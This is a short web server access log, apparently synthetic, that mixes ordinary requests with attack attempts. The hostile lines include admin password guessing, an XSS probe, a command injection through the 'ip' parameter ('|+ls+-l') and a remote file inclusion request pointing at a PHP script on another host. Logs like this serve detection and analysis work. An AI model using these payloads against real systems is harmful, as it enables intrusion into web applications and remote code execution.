182.34.27.162 - - [09/Aug/2021:11:42:27 +0200] "GET /index.php/?username=admin&password=1239 HTTP/1.0" 200 31940 "/connection.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
87.251.81.179 - - [09/Aug/2021:11:42:32 +0200] "GET /api/v1/login/?post=%3script%3ealert(1); HTTP/1.0" 200 60764 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:42:33 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 27526 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:42:33 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 78591 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:42:33 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 2151 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:42:33 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 51035 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:42:33 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 32592 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:42:38 +0200] "GET /core/files/js/upload.js/?ip=|+ls+-l HTTP/1.0" 404 14698 "/blog/how-to-shop/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
220.243.135.5 - - [09/Aug/2021:11:42:39 +0200] "GET /api/v1/register/?username=admin&password=1235 HTTP/1.1" 200 59477 "/index.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:42:40 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 400 28535 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:42:41 +0200] "GET /connection.php/ HTTP/1.0" 200 13510 "/api/v1/login/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
182.34.27.162 - - [09/Aug/2021:11:42:42 +0200] "GET /api/v1/login/?page=http://192.168.80.128/rfi.php HTTP/1.0" 200 73438 "/login.php/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
62.109.16.162 - - [09/Aug/2021:11:42:43 +0200] "GET / HTTP/1.0" 200 39275 "/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
